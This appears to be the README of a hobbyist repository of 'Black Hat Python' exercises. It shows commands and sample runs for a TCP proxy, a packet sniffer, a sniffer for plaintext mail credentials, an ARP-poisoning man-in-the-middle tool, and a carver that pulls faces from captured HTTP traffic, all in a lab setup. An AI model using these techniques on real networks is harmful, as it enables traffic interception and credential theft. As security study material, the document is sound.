# ctlfish

```
    ▄████▄  ▄▄▄█████▓ ██▓      █████▒██▓  ██████  ██░ ██
   ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒    ▓██   ▒▓██▒▒██    ▒ ▓██░ ██▒
   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░    ▒████ ░▒██▒░ ▓██▄   ▒██▀▀██░
   ▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██░    ░▓█▒  ░░██░  ▒   ██▒░▓█ ░██
   ▒ ▓███▀ ░  ▒██▒ ░ ░██████▒░▒█░   ░██░▒██████▒▒░▓█▒░██▓
   ░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▓  ░ ▒ ░   ░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
     ░  ▒       ░    ░ ░ ▒  ░ ░      ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
   ░          ░        ░ ░    ░ ░    ▒ ░░  ░  ░   ░  ░░ ░
   ░ ░                   ░  ░        ░        ░   ░  ░  ░
   ░
```
## What is this

This is a fun repo for doing little development doodles that are useful or interesting to me in some way.

### This dir tho?

This is mostly examples (and variations of examples) from the book Black Hat Python by Justin Seitz.

https://nostarch.com/blackhatpython

## Who is it for

It's mostly for me, but also for everyone.

## License

IANAL - [MIT license](https://opensource.org/licenses/MIT)

## Feature requests and bugfixes

Send me a PR, and I'll probably accept it. :D

## What's with the name?

It's related to [my activities on hackthebox.eu](https://www.hackthebox.eu/profile/235518) and other ethical hacking endeavors.

# Examples

## tcp_proxy.py

### example/test with ftp

watch the wire:
```
sudo tcpdump -s0 -i lo0 -nn -X port 9999 or port 22 or port 21
```

start a local ftp server on 2121
```
python3 -m pyftpdlib
```

start the proxy
```
./tcp_proxy.py -l 127.0.0.1 -p 9999 -r localhost -P 2121 -f
```

test it with lftp
```
lftp -d -p 9999 127.0.0.1
```

### example/test with ssh

Let's assume your sniffer is still running.

start a new proxy
```
./tcp_proxy.py -l 127.0.0.1 -p 9999 -r localhost -P 22 -f
```

test it with ssh
```
ssh -vvv localhost -p 9999
```

## scapy_single_packet.py

This is a test run with a 2 line ish sniffer with python3 on kali 2020

```
kali@kali:[~/src/ctlfish/net]:(master *+)
[Exit: 0] 17:51: sudo python3 scapy_single_packet.py
###[ IP ]###
  version   = 4
  ihl       = 5
  tos       = 0x18
  len       = 1365
  id        = 34014
  flags     = DF
  frag      = 0
  ttl       = 52
  proto     = tcp
  chksum    = 0x28bf
  src       = 192.99.200.113
  dst       = 10.8.1.17
  \options   \
###[ TCP ]###
     sport     = http
     dport     = 55330
     seq       = 1713480293
     ack       = 3034627426
     dataofs   = 5
     reserved  = 0
     flags     = A
     window    = 669
     chksum    = 0x6dcb
     urgptr    = 0
     options   = []
###[ Raw ]###
        load      = 'HTTP/1.1 302 Found\r\nDate: Sat, 11 Apr 2020 00:51:48 GMT\r\nServer: Apache/2.4.10 (Debian)\r\nX-MirrorBrain-Mirror: mirrors.ocf.berkeley.edu\r\nX-MirrorBrain-Realm: country\r\nLink: <http://http.kali.org/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb.meta4>; rel=describedby; type="application/metalink4+xml"\r\nLink: <http://mirrors.ocf.berkeley.edu/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb>; rel=duplicate; pri=1; geo=us\r\nLink: <http://kali.download/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb>; rel=duplicate; pri=2; geo=us\r\nLink: <http://mirror.pwnieexpress.com/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb>; rel=duplicate; pri=3; geo=us\r\nLink: <http://mirror.anquan.cl/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb>; rel=duplicate; pri=4; geo=cl\r\nLink: <http://ftp.hands.com/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb>; rel=duplicate; pri=5; geo=gb\r\nLocation: http://mirrors.ocf.berkeley.edu/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb\r\nContent-Length: 350\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>302 Found</title>\n</head><body>\n<h1>Found</h1>\n<p>The document has moved <a href="http://mirrors.ocf.berkeley.edu/kali/pool/main/t/tnscmd10g/tnscmd10g_1.3-1kali0_all.deb">he'

None
```

## mail_sniffer.py

Sniff enencrypted mail protocols with scapy

### run dovecot and a dummy smtpd

dovecot provides a simple backend for us to sling imap and pop3 traffic in a loop


Run smtpdlib to catch smtp data:

```
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
```

### loop auth attempts with watch

```
watch "python3 imap4_login_getmbox.py && python3 smtpdlib_senddata.py && python3 poplib_senddata.py"
```

### run the sniffer and watch the creds on the wire get caught via scapy magic and regex witchcraft

```
sudo python3 mail_sniffer.py
```

## arper.py

ARP cache spoofing / MITM attack. Requires ip forwarding to be enabled so we can pass victim traffic through to the real gateway.

```
kali@kali:[~/src/ctlfish/net]:(master %)
[Exit: 0] 10:07: sudo ./arper.py -g 192.168.86.1 -t 192.168.86.132 -i eth0 -f arper.pcap
Setting up to sniff on interface: eth0
Getting MAC addr for gateway: 192.168.1.1
Gateway: 192.168.1.1 is at: 1c:fd:11:0f:4e:9e
Getting MAC addr for target: 192.168.86.132
Target: 192.168.1.132 is at: 00:0c:29:4a:0c:f4
Poisoning target: 192.168.1.132 in background
Starting sniffer for 1000 packets
Restoring target: 192.168.1.132
Completed attack on:  192.168.1.132 results stored in: arper.pcap
```

## pic_carver.py

### Setup

Set up opencv and python for your platform https://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_tutorials.html

### slice it up

Next, take a packet capture and use it as input. I used one that I got with the arper.py tool in this repo.
This tool will slice up the pcap and find all the pictures in it sent over HTTP traffic. All the pictures are extracted.
After extracting a picture, we use opencv to check if the picture includes a faces. If the picture has a face detected,
we draw a box around the detected face and write a copy of the edited image to another folder.


```
kali@jabroni:[~/src/ctlfish/net]:(master *)
[Exit: 0] 10:13: ./pic_carver.py --help
usage: ./pic_carver.py [-h] [-f FACES] [-p PICTURES] [-i--infile INFILE]

This is a Python program to read a packet capture and pull images out of HTTP
traffic, then detect faces in those images.

optional arguments:
  -h, --help            show this help message and exit
  -f FACES, -faces FACES
                        path to store pictures with faces extracted from pcap
                        (default: ./faces)
  -p PICTURES, --pictures PICTURES
                        patch to store pictures extracted from pcap (default:
                        ./pictures)
  -i--infile INFILE     pcap file to read in (default: pic_carver.pcap)
```

```
kali@jabroni:[~/src/ctlfish/net]:(master *)
[Exit: 0] 10:13: ./pic_carver.py -i bigface.pcap
writing original image to: ./pictures/bigface.pcap-pic_carver_0.png
writing original image to: ./pictures/bigface.pcap-pic_carver_1.jpeg
Corrupt JPEG data: premature end of data segment
writing original image to: ./pictures/bigface.pcap-pic_carver_2.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_3.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_4.png
writing original image to: ./pictures/bigface.pcap-pic_carver_5.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_6.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_7.png
writing original image to: ./pictures/bigface.pcap-pic_carver_8.png
writing original image to: ./pictures/bigface.pcap-pic_carver_9.svg+xml
writing original image to: ./pictures/bigface.pcap-pic_carver_10.png
writing original image to: ./pictures/bigface.pcap-pic_carver_11.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_12.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_13.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_14.gif
writing original image to: ./pictures/bigface.pcap-pic_carver_15.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_16.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_17.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_18.png
writing original image to: ./pictures/bigface.pcap-pic_carver_19.png
writing original image to: ./pictures/bigface.pcap-pic_carver_20.png
writing original image to: ./pictures/bigface.pcap-pic_carver_21.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_22.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_23.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_24.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_25.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_26.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_27.jpeg
writing facial recognition edited image to: ./faces/bigface.pcap-pic_carver_face_28.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_28.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_29.png
writing original image to: ./pictures/bigface.pcap-pic_carver_30.png
writing original image to: ./pictures/bigface.pcap-pic_carver_31.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_32.vnd.microsoft.icon
writing original image to: ./pictures/bigface.pcap-pic_carver_33.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_34.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_35.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_36.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_37.png
writing original image to: ./pictures/bigface.pcap-pic_carver_38.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_39.png
writing original image to: ./pictures/bigface.pcap-pic_carver_40.png
writing original image to: ./pictures/bigface.pcap-pic_carver_41.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_42.png
writing original image to: ./pictures/bigface.pcap-pic_carver_43.png
writing original image to: ./pictures/bigface.pcap-pic_carver_44.png
writing original image to: ./pictures/bigface.pcap-pic_carver_45.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_46.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_47.png
writing original image to: ./pictures/bigface.pcap-pic_carver_48.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_49.png
writing original image to: ./pictures/bigface.pcap-pic_carver_50.jpeg
writing facial recognition edited image to: ./faces/bigface.pcap-pic_carver_face_51.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_51.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_52.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_53.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_54.jpeg
writing original image to: ./pictures/bigface.pcap-pic_carver_55.jpeg
writing facial recognition edited image to: ./faces/bigface.pcap-pic_carver_face_56.jpeg
all pictures in: ./pictures
pictures with faces in: ./faces
carved images: 56
faces detected: 3
```
